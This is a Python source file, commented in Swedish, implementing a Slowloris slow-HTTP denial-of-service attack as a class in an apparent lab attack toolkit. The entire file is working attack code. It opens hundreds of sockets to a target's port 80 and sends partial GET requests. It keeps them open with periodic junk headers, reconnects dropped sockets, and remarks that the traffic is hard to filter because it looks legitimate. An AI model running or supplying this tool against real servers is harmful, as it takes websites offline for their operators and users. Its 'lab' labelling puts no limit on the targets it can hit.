"""
Slowloris Attack - Slow HTTP DoS
Håller HTTP-connections öppna genom partiella requests
Mer äkta slowloris: håller många sockets öppna och skickar headers långsamt
Med avbryt-funktion via meny!
"""
import socket
import time
import random
from .base_attack import BaseAttack

class SlowlorisAttack(BaseAttack):
    """Slowloris - Äkta långsam HTTP DoS med öppna sockets"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.abort_requested = False

    def abort(self):
        self.abort_requested = True

    def get_attack_name(self):
        return "Slowloris Attack"

    def execute(self, count=200, delay=0.1, headers_interval=15):
        """
        Kör Slowloris attack med äkta sockets
        count: antal samtidiga sockets/anslutningar
        delay: delay mellan varje header-fragment (sekunder)
        headers_interval: antal sekunder mellan varje headers-runda
        """
        self.print_header("Slowloris Attack (Slow HTTP)", port=80, count=count)
        print("[*] Slowloris håller HTTP-connections öppna med partiella requests")
        print(f"[*] Antal sockets: {count}")
        print(f"[*] Delay mellan headers: {delay}s")
        print(f"[*] Headers skickas var {headers_interval}s")

        self.start_time = time.time()
        self.packets_sent = 0

        sockets = []
        # Skapa många sockets till target
        for i in range(count):
            if self.abort_requested:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, 80))
                s.sendall(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
                s.sendall(f"Host: {self.target_ip}\r\n".encode())
                s.sendall(f"User-Agent: SlowlorisLab\r\n".encode())
                s.sendall(f"X-Lab-{self.custom_message}: {i}\r\n".encode())
                sockets.append(s)
            except Exception as e:
                continue

        print(f"[+] {len(sockets)} sockets öppna mot target {self.target_ip}")

        # Huvudloop: skicka header-fragment på alla sockets
        try:
            while not self.abort_requested:
                for idx, s in enumerate(sockets):
                    if self.abort_requested:
                        break
                    try:
                        header = f"X-KeepAlive-{random.randint(0,9999)}: {self.custom_message}\r\n"
                        s.sendall(header.encode())
                        self.packets_sent += 1
                        time.sleep(delay)
                    except Exception:
                        try:
                            s.close()
                        except:
                            pass
                        try:
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(4)
                            new_s.connect((self.target_ip, 80))
                            new_s.sendall(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
                            new_s.sendall(f"Host: {self.target_ip}\r\n".encode())
                            new_s.sendall(f"User-Agent: SlowlorisLab\r\n".encode())
                            new_s.sendall(f"X-Lab-{self.custom_message}: {idx}\r\n".encode())
                            sockets[idx] = new_s
                        except:
                            pass
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] Slowloris håller {len(sockets)} sockets öppna ({self.packets_sent} headers skickade, {pps:.1f} pps)")
                time.sleep(headers_interval)
        except KeyboardInterrupt:
            print("[!] Avbryter slowloris och stänger anslutningar...")
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
        except Exception as e:
            print(f"[!] Fel i slowloris: {e}")

        for s in sockets:
            try:
                s.close()
            except:
                pass

        self.log_attack("SLOWLORIS",
                        f"{len(sockets)} sockets, target: {self.target_ip}, message: {self.custom_message}")
        self.print_summary()
        print("\n[!] Slowloris håller anslutningar öppna med långsamma headers")
        print("[!] Svår att filtrera - ser ut som legitim trafik")